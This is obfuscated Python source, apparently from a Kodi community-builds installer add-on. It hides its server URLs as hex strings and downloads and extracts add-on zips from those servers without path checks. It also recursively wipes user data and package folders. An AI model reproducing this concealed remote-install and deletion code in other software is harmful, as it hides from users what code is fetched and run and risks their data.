 oOOoOoo0O0 = I1III11iiii11i1 [ 0 ] if ( len ( I1III11iiii11i1 ) > 0 ) else ''
 i1i1ii1111i1i = ooOo0OoO [ 0 ] if ( len ( ooOo0OoO ) > 0 ) else ''
 iIiI = i1iiIIi1I [ 0 ] if ( len ( i1iiIIi1I ) > 0 ) else ''
 ii1iIIiii1 = iiI1I1IIi11i1 [ 0 ] if ( len ( iiI1I1IIi11i1 ) > 0 ) else ''
 ooOo0O0o0 = i1II1iii1i [ 0 ] if ( len ( i1II1iii1i ) > 0 ) else ''
 o0oo0O = OOO0o [ 0 ] if ( len ( OOO0o ) > 0 ) else ''
 I1iiIII = iIIII1 [ 0 ] if ( len ( iIIII1 ) > 0 ) else ''
 iIi1I1 = Oo00O0Oo0Oo [ 0 ] if ( len ( Oo00O0Oo0Oo ) > 0 ) else ''
 O0oOoo0OoO0O = I1I11iO0 [ 0 ] if ( len ( I1I11iO0 ) > 0 ) else 'None'
 oo00IiI1 = iIiII [ 0 ] if ( len ( iIiII ) > 0 ) else 'None'
 oOo00o00oO = i1i1IIIIIIIi [ 0 ] if ( len ( i1i1IIIIIIIi ) > 0 ) else 'None'
 o0000 = oo0o0oOo [ 0 ] if ( len ( oo0o0oOo ) > 0 ) else 'None'
 i111i1i = OO0oOOo0o [ 0 ] if ( len ( OO0oOOo0o ) > 0 ) else 'None'
 oO00O0 = OOO [ 0 ] if ( len ( OOO ) > 0 ) else 'None'
 O00Ooo = iIIi1IIi [ 0 ] if ( len ( iIIi1IIi ) > 0 ) else 'None'
 OOOO0OOO = i111i11I1ii [ 0 ] if ( len ( i111i11I1ii ) > 0 ) else 'None'
 i1i1ii = OOooo [ 0 ] if ( len ( OOooo ) > 0 ) else 'None'
 iII1ii1 = oo0 [ 0 ] if ( len ( oo0 ) > 0 ) else 'None'
 I1i1iiiI1 = oOOII1i11i1iIi11 [ 0 ] if ( len ( oOOII1i11i1iIi11 ) > 0 ) else 'None'
 O0OOooOoO = oo0O0oO0O0O [ 0 ] if ( len ( oo0O0oO0O0O ) > 0 ) else 'None'
 i1II1I1Iii1 = oOo0O [ 0 ] if ( len ( oOo0O ) > 0 ) else 'None'
 iiI11Iii = I11i [ 0 ] if ( len ( I11i ) > 0 ) else 'None'
 O0o0O0 = Iiii1 [ 0 ] if ( len ( Iiii1 ) > 0 ) else 'None'
 Ii1II1I11i1 = iIIIiiiI11I [ 0 ] if ( len ( iIIIiiiI11I ) > 0 ) else 'None'
 ooOoO = open ( i1iIIi1 , mode = 'w+' )
 ooOoO . write ( 'id="' + str ( video ) + '"\nname="' + ooooooo00o + '"\nversion="' + IIIIiiIiiI + '"' )
 ooOoO . close ( )
 iII ( '[COLOR=yellow]Full description[/COLOR]' , 'None' , 'description' , 'BUILDDETAILS.png' , iii11i1IIII , ooooooo00o , Oo0o , IIIIiiIiiI , IIIII1 , i11II1I11I1 , i1i1ii1111i1i , iIiI , ii1iIIiii1 , ooOo0O0o0 , o0oo0O , I1iiIII , iIi1I1 )
 if oO00O0 != 'None' :
  Ii ( '' , '[COLOR=lavender]Watch Preview Video[/COLOR]' , oO00O0 , 'play_video' , 'Video_Preview.png' , iii11i1IIII , '' , '' )
 if O00Ooo != 'None' :
  Ii ( '' , '[COLOR=lavender](VIDEO) ' + O0OOooOoO + '[/COLOR]' , O00Ooo , 'play_video' , 'Video_Guide.png' , iii11i1IIII , '' , '' )
 if OOOO0OOO != 'None' :
  Ii ( '' , '[COLOR=lavender](VIDEO) ' + i1II1I1Iii1 + '[/COLOR]' , OOOO0OOO , 'play_video' , 'Video_Guide.png' , iii11i1IIII , '' , '' )
 if i1i1ii != 'None' :
  Ii ( '' , '[COLOR=lavender](VIDEO) ' + iiI11Iii + '[/COLOR]' , i1i1ii , 'play_video' , 'Video_Guide.png' , iii11i1IIII , '' , '' )
 if iII1ii1 != 'None' :
  Ii ( '' , '[COLOR=lavender](VIDEO) ' + O0o0O0 + '[/COLOR]' , iII1ii1 , 'play_video' , 'Video_Guide.png' , iii11i1IIII , '' , '' )
 if I1i1iiiI1 != 'None' :
  Ii ( '' , '[COLOR=lavender](VIDEO) ' + Ii1II1I11i1 + '[/COLOR]' , I1i1iiiI1 , 'play_video' , 'Video_Guide.png' , iii11i1IIII , '' , '' )
 if oo00IiI1 == 'None' :
  Oo0oOOo ( '[COLOR=gold]Sorry this build is currently unavailable[/COLOR]' , '' , '' , '' , '' , '' , '' , '' , '' , '' )
 if i1iIi . endswith ( "visibility=premium" ) or i1iIi . endswith ( "visibility=reseller_private" ) or i1iIi . endswith ( "visibility=reseller_openelec" ) :
  if ( Iii != '' ) and ( Iii != 'fail' ) and ( os . path . exists ( Iii ) ) :
   if i1iIi . endswith ( "visibility=reseller_openelec" ) :
    Oo0oOOo ( '[COLOR=lime]Install - THIS WILL WIPE ANY EXISTING KODI SETTINGS[/COLOR]' , oo00IiI1 , 'restore_openelec' , i1i1iII1 , iii11i1IIII , '' , ooooooo00o , '' , '' , '' )
   if i1iIi . endswith ( "visibility=premium" ) or i1iIi . endswith ( "visibility=reseller_private" ) and not i1iIi . endswith ( "visibility=reseller_openelec" ) and oo00IiI1 != 'None' :
    Oo0oOOo ( '[COLOR=lime]First Time Install - THIS WILL DOWNLOAD THE WHOLE BUILD[/COLOR]' , oo00IiI1 , 'restore_community' , i1i1iII1 , iii11i1IIII , o0iIiiIiiIi , ooooooo00o , oOOoOoo0O0 , O0oOoo0OoO0O , i1iiIIIi )
   if i1iIi . endswith ( "visibility=premium" ) or i1iIi . endswith ( "visibility=reseller_private" ) and oOo00o00oO != 'None' :
    Oo0oOOo ( '[COLOR=orange]Update This Build (Latest Update: ' + o0000 + ')[/COLOR]' , oOo00o00oO , 'update_build' , i1i1iII1 , iii11i1IIII , i111i1i , ooooooo00o , oOOoOoo0O0 , O0oOoo0OoO0O , o0000 )
  if ( ( Iii != '' ) and not os . path . exists ( Iii ) and ( Iii != 'fail' ) ) :
   i1o0oooO = 1
   IiI . ok ( "Security check failed, contact box seller" , 'This box cannot be identified as an official' , '[COLOR=lime]' + I1IiiI + '[/COLOR] product. Please contact the' , 'seller you purchased this device from for more details.' )
  if Iii == 'fail' :
   i1o0oooO = 1
   IiI . ok ( "Subscription not paid" , 'The box seller has either opted out of the premium' , 'plan or has unpaid debts to the Community Builders.' , 'Please contact the seller you purchased this device from for more details.' )
  if Iii == '' :
   if i1iIi . endswith ( "visibility=reseller_openelec" ) :
    Oo0oOOo ( '[COLOR=lime]Install - THIS WILL WIPE ANY EXISTING KODI SETTINGS[/COLOR]' , oo00IiI1 , 'restore_openelec' , i1i1iII1 , iii11i1IIII , '' , ooooooo00o , '' , '' , '' )
   if i1iIi . endswith ( "visibility=premium" ) or i1iIi . endswith ( "visibility=reseller_private" ) and not i1iIi . endswith ( "visibility=reseller_openelec" ) and oo00IiI1 != 'None' :
    Oo0oOOo ( '[COLOR=lime]First Time Install - THIS WILL DOWNLOAD THE WHOLE BUILD[/COLOR]' , oo00IiI1 , 'restore_community' , i1i1iII1 , iii11i1IIII , o0iIiiIiiIi , ooooooo00o , oOOoOoo0O0 , O0oOoo0OoO0O , i1iiIIIi )
   if i1iIi . endswith ( "visibility=premium" ) or i1iIi . endswith ( "visibility=reseller_private" ) and oOo00o00oO != 'None' :
    Oo0oOOo ( '[COLOR=orange]Update This Build (Latest Update: ' + o0000 + ')[/COLOR]' , oOo00o00oO , 'update_build' , i1i1iII1 , iii11i1IIII , i111i1i , ooooooo00o , oOOoOoo0O0 , O0oOoo0OoO0O , o0000 )
 else :
  Oo0oOOo ( '[COLOR=lime]Install Part 1: Download ' + ooooooo00o + '[/COLOR]' , oo00IiI1 , 'restore_community' , i1i1iII1 , iii11i1IIII , '' , ooooooo00o , oOOoOoo0O0 , O0oOoo0OoO0O , i1iiIIIi )
 if i1o0oooO == 0 :
  if O0oOoo0OoO0O == 'None' :
   pass
  else :
   if not i1iIi . endswith ( "visibility=reseller_openelec" ) :
    Ii ( '' , '[COLOR=dodgerblue]Install Part 2: Apply guisettings.xml fix[/COLOR]' , O0oOoo0OoO0O , 'guisettingsfix' , 'Fix_My_Build.png' , iii11i1IIII , '' , '' )
    if 19 - 19: I1i1iii - o0oO - oOOoO0O0O0 / oOOoO0O0O0 + OoOo
def OO0Oooo0oo ( title , url , mode , iconimage , fanart , updateDesc , description , skins , guisettingslink , updateDate ) :
 iIII1I1i1i = IiI . yesno ( "Update Pack Details" , updateDesc )
 if iIII1I1i1i == 1 :
  I1i111IiIiIi1 ( ooooooo00o , url , '' , description , skins , guisettingslink , '' )
  if 39 - 39: Oo000o - Ooo0Oo0
def OOO0o0OO0OO ( url , video ) :
 oOo0OII ( 'disclaimer.xml' )
 iII1Iii1I11i ( url , video )
 if 15 - 15: Oo000o + OoO0O00 . oOOoO0O0O0 * II11iII . OoOo
 if 18 - 18: o0oO % I1i1iii + i1OOO % OoO0O00
def iiIiIiII ( ) :
 print '############################################################       DELETING USERDATA             ###############################################################'
 oOOoO0OO00OOo0 = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data' , '' ) )
 for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( oOOoO0OO00OOo0 ) :
  II1Ii = 0
  II1Ii += len ( i1i1i1I )
  if 89 - 89: OoOo - II11iII
  if II1Ii >= 0 :
   for IiI11i1IIiiI in i1i1i1I :
    os . unlink ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) )
   for OooOo00o in IiIi1ii111i1 :
    shutil . rmtree ( os . path . join ( Ii1IIii , OooOo00o ) )
    if 8 - 8: iii11I111 / Ooo0Oo0 - i11iIiiIii % Ii1iIIIi1ii
    if 66 - 66: O0oO
def O0oOo ( ) :
 for OO0oOO0ooO in glob . glob ( os . path . join ( oOOoO0 , 'xbmc_crashlog*.*' ) ) :
  iIii1iI = OO0oOO0ooO
  print OO0oOO0ooO
  os . remove ( OO0oOO0ooO )
  IiI = xbmcgui . Dialog ( )
  IiI . ok ( "Crash Logs Deleted" , "Your old crash logs have now been deleted." )
  if 53 - 53: Ii1iIIIi1ii - OOO00OoOO00 % OoOo * i1OOO % oO00Oo0o000
  if 29 - 29: iii11I111 / iiiIi1i1I * Ooo0Oo0 . iii11I111
def iIi ( ) :
 print '############################################################       DELETING PACKAGES             ###############################################################'
 oO00 = xbmc . translatePath ( os . path . join ( 'special://home/addons/packages' , '' ) )
 for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( oO00 ) :
  II1Ii = 0
  II1Ii += len ( i1i1i1I )
  if 1 - 1: OOO00OoOO00
  if II1Ii > 0 :
   for IiI11i1IIiiI in i1i1i1I :
    os . unlink ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) )
   for OooOo00o in IiIi1ii111i1 :
    shutil . rmtree ( os . path . join ( Ii1IIii , OooOo00o ) )
    if 12 - 12: oO00Oo0o000 % iiIi + OOO00OoOO00 - o0oO . OoO0O00 / iiIi
    if 51 - 51: oOOoO0O0O0 . iiIi
def Ooi11III1II1 ( ) :
 print '############################################################       DELETING USERDATA             ###############################################################'
 oOOoO0OO00OOo0 = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data' , '' ) )
 for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( oOOoO0OO00OOo0 ) :
  II1Ii = 0
  II1Ii += len ( i1i1i1I )
  if 42 - 42: I1i1iii * iiIi % o0oO - OoO0O00 % O0oO
  if II1Ii >= 0 :
   for IiI11i1IIiiI in i1i1i1I :
    os . unlink ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) )
   for OooOo00o in IiIi1ii111i1 :
    shutil . rmtree ( os . path . join ( Ii1IIii , OooOo00o ) )
    if 36 - 36: i11iIiiIii / OOO00OoOO00 * Ooo0Oo0 * Ooo0Oo0 + OoO0O00 * Oo000o
    if 32 - 32: II11iII
def o0O0O0ooo0oOO ( name , addon_id ) :
 O00OoOO0oo0 = 1
 Ii1iIiII1Ii = 1
 i1iii11 = xbmc . translatePath ( os . path . join ( o0oO0 , addon_id , 'addon.xml' ) )
 oOo0O0o0000o0O0 = open ( i1iii11 , mode = 'r' )
 o0OoOoOOoOo0o = oOo0O0o0000o0O0 . read ( )
 oOo0O0o0000o0O0 . close ( )
 iIiii = re . compile ( 'import addon="(.+?)"' ) . findall ( o0OoOoOOoOo0o )
 for o0OoOO in iIiii :
  if not 'xbmc.python' in o0OoOO :
   print 'Script Requires --- ' + o0OoOO
   IiIii1ii = xbmc . translatePath ( os . path . join ( o0oO0 , o0OoOO ) )
   if not os . path . exists ( IiIii1ii ) :
    IIiI1i = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4164646f6e506f7274616c2f646570656e64656e6379696e7374616c6c2e7068703f69643d2573'
    i1iIi = binascii . unhexlify ( IIiI1i ) % ( o0OoOO )
    ooOOoooooo = II1I ( i1iIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    O0 = re . compile ( 'name="(.+?)"' ) . findall ( ooOOoooooo )
    o00oooO0Oo = re . compile ( 'version="(.+?)"' ) . findall ( ooOOoooooo )
    I1iI1iIi111i = re . compile ( 'repo_url="(.+?)"' ) . findall ( ooOOoooooo )
    iiIi1IIi1I = re . compile ( 'data_url="(.+?)"' ) . findall ( ooOOoooooo )
    o0OoOO000ooO0 = re . compile ( 'zip_url="(.+?)"' ) . findall ( ooOOoooooo )
    o00o0 = re . compile ( 'repo_id="(.+?)"' ) . findall ( ooOOoooooo )
    iII1 = O0 [ 0 ] if ( len ( O0 ) > 0 ) else ''
    IIIIiiIiiI = o00oooO0Oo [ 0 ] if ( len ( o00oooO0Oo ) > 0 ) else ''
    O000O = I1iI1iIi111i [ 0 ] if ( len ( I1iI1iIi111i ) > 0 ) else ''
    Oo00OO0 = iiIi1IIi1I [ 0 ] if ( len ( iiIi1IIi1I ) > 0 ) else ''
    oo0O = o0OoOO000ooO0 [ 0 ] if ( len ( o0OoOO000ooO0 ) > 0 ) else ''
    oO00OoOOOo = o00o0 [ 0 ] if ( len ( o00o0 ) > 0 ) else ''
    Oo0 = xbmc . translatePath ( os . path . join ( OO0oOoo , iII1 + '.zip' ) )
    try :
     downloader . download ( O000O , Oo0 , ooOo )
     iIIII1iIIii ( Oo0 , II11iiii1Ii , ooOo )
    except :
     try :
      downloader . download ( oo0O , Oo0 , ooOo )
      iIIII1iIIii ( Oo0 , II11iiii1Ii , ooOo )
     except :
      try :
       if not os . path . exists ( IiIii1ii ) :
        os . makedirs ( IiIii1ii )
       ooOOoooooo = II1I ( Oo00OO0 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
       oOOO00o000o = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( ooOOoooooo )
       for iIi11i1 in oOOO00o000o :
        oO00oo0o00o0o = xbmc . translatePath ( os . path . join ( IiIii1ii , iIi11i1 ) )
        if addon_id not in iIi11i1 and '/' not in iIi11i1 :
         try :
          ooOo . update ( 0 , "Downloading [COLOR=yellow]" + iIi11i1 + '[/COLOR]' , '' , 'Please wait...' )
          print "downloading: " + Oo00OO0 + iIi11i1
          downloader . download ( Oo00OO0 + iIi11i1 , oO00oo0o00o0o , ooOo )
         except : print "failed to install" + iIi11i1
        if '/' in iIi11i1 and '..' not in iIi11i1 and 'http' not in iIi11i1 :
         IiIIIIIi = Oo00OO0 + iIi11i1
         IiIi1iIIi1 ( oO00oo0o00o0o , IiIIIIIi )
      except :
       IiI . ok ( "Error downloading dependency" , 'There was an error downloading [COLOR=yellow]' + iII1 , '[/COLOR]Please consider updating the add-on portal with details' , 'or report the error on the forum at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B]' )
       Ii1iIiII1Ii = 0
       O00OoOO0oo0 = 0
    if Ii1iIiII1Ii == 1 :
     time . sleep ( 1 )
     ooOo . update ( 0 , "[COLOR=yellow]" + iII1 + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Please wait...' )
     time . sleep ( 1 )
     oo00ooOoO00 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4164646f6e506f7274616c2f646f776e6c6f6164636f756e742e7068703f69643d2573'
     o00oOoOo0 = binascii . unhexlify ( oo00ooOoO00 ) % ( o0OoOO )
     II1I ( o00oOoOo0 )
 ooOo . close ( )
 time . sleep ( 1 )
 if 80 - 80: OoO0O00 - iii11I111
 if 41 - 41: iii11I111 - iiiIi1i1I * iiIi
def OO0OoOo0OOO ( name , url , buildname , author , version , description , updated , skins , videoaddons , audioaddons , programaddons , pictureaddons , sources , adult ) :
 Ii1ii11IIIi ( buildname + '     v.' + version , '[COLOR=yellow][B]Author:   [/B][/COLOR]' + author + '[COLOR=yellow][B]               Last Updated:   [/B][/COLOR]' + updated + '[COLOR=yellow][B]               Adult Content:   [/B][/COLOR]' + adult + '[CR][CR][COLOR=yellow][B]Description:[CR][/B][/COLOR]' + description +
 '[CR][CR][COLOR=blue][B]Skins:   [/B][/COLOR]' + skins + '[CR][CR][COLOR=blue][B]Video Addons:   [/B][/COLOR]' + videoaddons + '[CR][CR][COLOR=blue][B]Audio Addons:   [/B][/COLOR]' + audioaddons +
 '[CR][CR][COLOR=blue][B]Program Addons:   [/B][/COLOR]' + programaddons + '[CR][CR][COLOR=blue][B]Picture Addons:   [/B][/COLOR]' + pictureaddons + '[CR][CR][COLOR=blue][B]Sources:   [/B][/COLOR]' + sources +
 '[CR][CR][COLOR=gold]Disclaimer: [/COLOR]These are community builds and they may overwrite some of your existing settings, '
 'TotalXBMC take no responsibility over what content is included in these builds, it\'s up to the individual who uploads the build to state what\'s included and then the users decision to decide whether or not that content is suitable for them.' )
 if 82 - 82: OOO00OoOO00 * Ii1iIIIi1ii . iii11I111 . Ooo0Oo0 + oOOoO0O0O0 / iiIi
 if 58 - 58: i1OOO / oO00Oo0o000 + O0OOO + oO00Oo0o000 . Ii1iIIIi1ii + I1i1iii
def I1o0o0OoOOOOOo ( path ) :
 ooOo . create ( "[COLOR=blue]T[/COLOR]otal[COLOR=dodgerblue]R[/COLOR]evolution" , "Wiping..." , '' , 'Please Wait' )
 shutil . rmtree ( path , ignore_errors = True )
 if 39 - 39: Iii1i1I11I * oOOoO0O0O0 * O0OOO . Oo000o . II11iII + oO00Oo0o000
def II1IIi ( url , dest , dp = None ) :
 if not dp :
  dp = xbmcgui . DialogProgress ( )
  dp . create ( "Speed Test" , "Testing your internet speed..." , ' ' , ' ' )
 dp . update ( 0 )
 OOoOO0o = time . time ( )
 if 51 - 51: iiiIi1i1I - Ooo0Oo0 * Oo000o
 try :
  urllib . urlretrieve ( url , dest , lambda ii1111Ii1i , IiI1iiI1III1I , Oo000 : Oo0O0OOOoo ( ii1111Ii1i , IiI1iiI1III1I , Oo000 , dp , OOoOO0o ) )
 except :
  pass
  if 57 - 57: OoOo
  if 17 - 17: oO00Oo0o000
 return ( time . time ( ) - OOoOO0o )
 if 81 - 81: O0OOO / O0oO - Ii1iIIIi1ii / I1i1iii
 if 86 - 86: Ii1iIIIi1ii
def iIIII1iIIii ( _in , _out , dp = None ) :
 if dp :
  return II1I11Iii1 ( _in , _out , dp )
  if 16 - 16: OoO0O00 * II11iII / OOO00OoOO00
 return II1iiI ( _in , _out )
 if 31 - 31: iii11I111 % Oo000o + Ii1iIIIi1ii + i11iIiiIii * i1OOO
 if 45 - 45: oOOoO0O0O0 * i1OOO . oO00Oo0o000 - i1OOO + O0oO
def II1iiI ( _in , _out ) :
 try :
  Ooooooo = zipfile . ZipFile ( _in , 'r' )
  Ooooooo . extractall ( _out )
 except Exception , Oo0O0O0ooO0O :
  print str ( Oo0O0O0ooO0O )
  return False
 return True
 if 34 - 34: oOOoO0O0O0 . iiiIi1i1I
 if 78 - 78: Ooo0Oo0 % iiIi / Iii1i1I11I % oOOoO0O0O0 - ooOO0o
def II1I11Iii1 ( _in , _out , dp ) :
 Ooooooo = zipfile . ZipFile ( _in , 'r' )
 o0ooO = float ( len ( Ooooooo . infolist ( ) ) )
 OoOOOo0o0ooo = 0
 try :
  for I1iiiiI1iI in Ooooooo . infolist ( ) :
   OoOOOo0o0ooo += 1
   iIiiiii1i = OoOOOo0o0ooo / o0ooO * 100
   dp . update ( int ( iIiiiii1i ) )
   Ooooooo . extract ( I1iiiiI1iI , _out )
 except Exception , Oo0O0O0ooO0O :
  print str ( Oo0O0O0ooO0O )
  return False
 return True
 if 2 - 2: Ii1iIIIi1ii
def I1iii ( ) :
 os . remove ( ii11iIi1I )
 os . rename ( iI111I11I1I1 , ii11iIi1I )
 xbmc . executebuiltin ( 'UnloadSkin' )
 xbmc . executebuiltin ( "ReloadSkin" )
 IiI . ok ( "Local Restore Complete" , 'XBMC/Kodi will now close.' , '' , '' )
 xbmc . executebuiltin ( "Quit" )
 if 45 - 45: Iii1i1I11I / i11iIiiIii
 if 10 - 10: ooOO0o - OOO00OoOO00 * Ii1iIIIi1ii % Ii1iIIIi1ii * O0oO - Ooo0Oo0
def i1I1 ( url ) :
 ooOo . create ( "[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]" , "Renaming paths..." , '' , 'Please Wait' )
 for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( url ) :
  for file in i1i1i1I :
   if file . endswith ( ".xml" ) :
    ooOo . update ( 0 , "Fixing" , file , 'Please Wait' )
    ooO00O0O0 = open ( ( os . path . join ( Ii1IIii , file ) ) ) . read ( )
    OoO0O0oO00 = ooO00O0O0 . replace ( Oo , 'special://home/' )
    IiI11i1IIiiI = open ( ( os . path . join ( Ii1IIii , file ) ) , mode = 'w' )
    IiI11i1IIiiI . write ( str ( OoO0O0oO00 ) )
    IiI11i1IIiiI . close ( )
    if 33 - 33: O0OOO
    if 78 - 78: O0OOO / I1i1iii * II11iII
def IiIi1iI11 ( ) :
 iiI1iI1I = '687474703a2f2f746f74616c78626d632e74762f746f74616c7265766f6c7574696f6e2f4164646f6e5f4669782f6164646f6e6669782e747874'
 III1II111Ii1 = binascii . unhexlify ( iiI1iI1I )
 ooOOoooooo = II1I ( III1II111Ii1 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oOOO00o000o = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( ooOOoooooo )
 for ooooooo00o , o0O0OO0o , i1i1iII1 , iii11i1IIII , IIIII1 in oOOO00o000o :
  Ii ( '' , ooooooo00o , o0O0OO0o , 'OSS' , i1i1iII1 , iii11i1IIII , '' , IIIII1 )
  if 54 - 54: OoOo . OOO00OoOO00 % i11iIiiIii / Iii1i1I11I + O0oO % OOO00OoOO00
  if 36 - 36: OOO00OoOO00
def o0OO ( url ) :
 Ii ( 'folder' , 'Anime' , str ( url ) + '&genre=anime' , 'grab_builds' , 'anime.png' , '' , '' , '' )
 Ii ( 'folder' , 'Audiobooks' , str ( url ) + '&genre=audiobooks' , 'grab_builds' , 'audiobooks.png' , '' , '' , '' )
 Ii ( 'folder' , 'Comedy' , str ( url ) + '&genre=comedy' , 'grab_builds' , 'comedy.png' , '' , '' , '' )
 Ii ( 'folder' , 'Comics' , str ( url ) + '&genre=comics' , 'grab_builds' , 'comics.png' , '' , '' , '' )
 Ii ( 'folder' , 'Documentary' , str ( url ) + '&genre=documentary' , 'grab_builds' , 'documentary.png' , '' , '' , '' )
 Ii ( 'folder' , 'Downloads' , str ( url ) + '&genre=downloads' , 'grab_builds' , 'downloads.png' , '' , '' , '' )
 Ii ( 'folder' , 'Food' , str ( url ) + '&genre=food' , 'grab_builds' , 'food.png' , '' , '' , '' )
 Ii ( 'folder' , 'Gaming' , str ( url ) + '&genre=gaming' , 'grab_builds' , 'gaming.png' , '' , '' , '' )
 Ii ( 'folder' , 'Health' , str ( url ) + '&genre=health' , 'grab_builds' , 'health.png' , '' , '' , '' )
 Ii ( 'folder' , 'How To...' , str ( url ) + '&genre=howto' , 'grab_builds' , 'howto.png' , '' , '' , '' )
 Ii ( 'folder' , 'Kids' , str ( url ) + '&genre=kids' , 'grab_builds' , 'kids.png' , '' , '' , '' )
 Ii ( 'folder' , 'Live TV' , str ( url ) + '&genre=livetv' , 'grab_builds' , 'livetv.png' , '' , '' , '' )
 Ii ( 'folder' , 'Movies' , str ( url ) + '&genre=movies' , 'grab_builds' , 'movies.png' , '' , '' , '' )
 Ii ( 'folder' , 'Music' , str ( url ) + '&genre=music' , 'grab_builds' , 'music.png' , '' , '' , '' )
 Ii ( 'folder' , 'News' , str ( url ) + '&genre=news' , 'grab_builds' , 'news.png' , '' , '' , '' )
 Ii ( 'folder' , 'Photos' , str ( url ) + '&genre=photos' , 'grab_builds' , 'photos.png' , '' , '' , '' )
 Ii ( 'folder' , 'Podcasts' , str ( url ) + '&genre=podcasts' , 'grab_builds' , 'podcasts.png' , '' , '' , '' )
 Ii ( 'folder' , 'Radio' , str ( url ) + '&genre=radio' , 'grab_builds' , 'radio.png' , '' , '' , '' )
 Ii ( 'folder' , 'Religion' , str ( url ) + '&genre=religion' , 'grab_builds' , 'religion.png' , '' , '' , '' )
 Ii ( 'folder' , 'Space' , str ( url ) + '&genre=space' , 'grab_builds' , 'space.png' , '' , '' , '' )
 Ii ( 'folder' , 'Sports' , str ( url ) + '&genre=sports' , 'grab_builds' , 'sports.png' , '' , '' , '' )
 Ii ( 'folder' , 'Technology' , str ( url ) + '&genre=tech' , 'grab_builds' , 'tech.png' , '' , '' , '' )
 Ii ( 'folder' , 'Trailers' , str ( url ) + '&genre=trailers' , 'grab_builds' , 'trailers.png' , '' , '' , '' )
 Ii ( 'folder' , 'TV Shows' , str ( url ) + '&genre=tv' , 'grab_builds' , 'tv.png' , '' , '' , '' )
 Ii ( 'folder' , 'Misc.' , str ( url ) + '&genre=other' , 'grab_builds' , 'other.png' , '' , '' , '' )
 if OO0o . getSetting ( 'adult' ) == 'true' :
  Ii ( 'folder' , 'XXX' , str ( url ) + '&genre=adult' , 'grab_builds' , 'adult.png' , '' , '' , '' )
  if 7 - 7: iii11I111 / II11iII * i11iIiiIii * O0OOO
def o00IiI1iiII1i1i ( ) :
 i1IiI = datetime . datetime . now ( )
 o0o0O00 = time . mktime ( i1IiI . timetuple ( ) ) + ( i1IiI . microsecond / 1000000. )
 oOo000OOooO0O = str ( '%f' % o0o0O00 )
 oOo000OOooO0O = oOo000OOooO0O . replace ( '.' , '' )
 oOo000OOooO0O = oOo000OOooO0O [ : - 3 ]
 return oOo000OOooO0O
 if 44 - 44: O0OOO . OOO00OoOO00 * i11iIiiIii % i11iIiiIii + O0OOO / oOOoO0O0O0
def O0O00OOo ( default = "" , heading = "" , hidden = False ) :
 o00oOOO0Ooo = xbmc . Keyboard ( default , heading , hidden )
 if 50 - 50: OoO0O00 - i11iIiiIii + Ii1iIIIi1ii / O0OOO - OoO0O00 + iii11I111
 o00oOOO0Ooo . doModal ( )
 if ( o00oOOO0Ooo . isConfirmed ( ) ) :
  return unicode ( o00oOOO0Ooo . getText ( ) , "utf-8" )
 return default
 if 22 - 22: I1i1iii - OoO0O00 / oO00Oo0o000 % Iii1i1I11I + oOOoO0O0O0
 if 5 - 5: II11iII / ooOO0o + i11iIiiIii % Oo000o
 if 93 - 93: OoOo % Ii1iIIIi1ii
 if 90 - 90: iiIi - oOOoO0O0O0 / OoO0O00 / O0OOO / Oo000o
 if 87 - 87: OoOo / O0oO + Ii1iIIIi1ii
 if 93 - 93: Ii1iIIIi1ii + OOO00OoOO00 % oO00Oo0o000
 if 21 - 21: oOOoO0O0O0
 if 6 - 6: O0oO
 if 46 - 46: O0oO + OOO00OoOO00
 if 79 - 79: Iii1i1I11I - O0oO * O0oO . OoOo
 if 100 - 100: I1i1iii * Oo000o % iiIi / Ooo0Oo0
 if 90 - 90: Ooo0Oo0 . oO00Oo0o000 . OoOo . OoO0O00
 if 4 - 4: OoO0O00 + OoOo % Ooo0Oo0 / i11iIiiIii
 if 74 - 74: I1i1iii . O0OOO - iiIi + O0oO % i11iIiiIii % OoOo
 if 78 - 78: OoO0O00 + OoOo + O0oO - O0oO . i11iIiiIii / II11iII
 if 27 - 27: OoO0O00 - O0OOO % Oo000o * i1OOO . O0oO % Ii1iIIIi1ii
 if 37 - 37: Iii1i1I11I + O0OOO - o0oO % oO00Oo0o000
 if 24 - 24: OoOo
 if 94 - 94: o0oO * o0oO % I1i1iii + oOOoO0O0O0
 if 28 - 28: iiIi
 if 49 - 49: Oo000o . iii11I111 % OOO00OoOO00 / OoO0O00
 if 95 - 95: O0OOO * OoOo * O0oO . oO00Oo0o000 / Ii1iIIIi1ii
 if 28 - 28: O0oO + OOO00OoOO00 - oO00Oo0o000 / Ii1iIIIi1ii - iiIi
 if 45 - 45: O0OOO / o0oO * OOO00OoOO00 * II11iII
 if 35 - 35: Ooo0Oo0 / ooOO0o % iiIi + Ii1iIIIi1ii
 if 79 - 79: OoOo / oO00Oo0o000
 if 77 - 77: iiiIi1i1I
 if 46 - 46: i1OOO
def o00OoooooooOo ( ) :
 iIii1I = [ ]
 iii11i1 = sys . argv [ 2 ]
 if len ( iii11i1 ) >= 2 :
  i1IiI1I111iIi = sys . argv [ 2 ]
  IiiIIi1 = i1IiI1I111iIi . replace ( '?' , '' )
  if ( i1IiI1I111iIi [ len ( i1IiI1I111iIi ) - 1 ] == '/' ) :
   i1IiI1I111iIi = i1IiI1I111iIi [ 0 : len ( i1IiI1I111iIi ) - 2 ]
  iI1iIiiI = IiiIIi1 . split ( '&' )
  iIii1I = { }
  for Oo0OOo in range ( len ( iI1iIiiI ) ) :
   Ii1I11i11I1i = { }
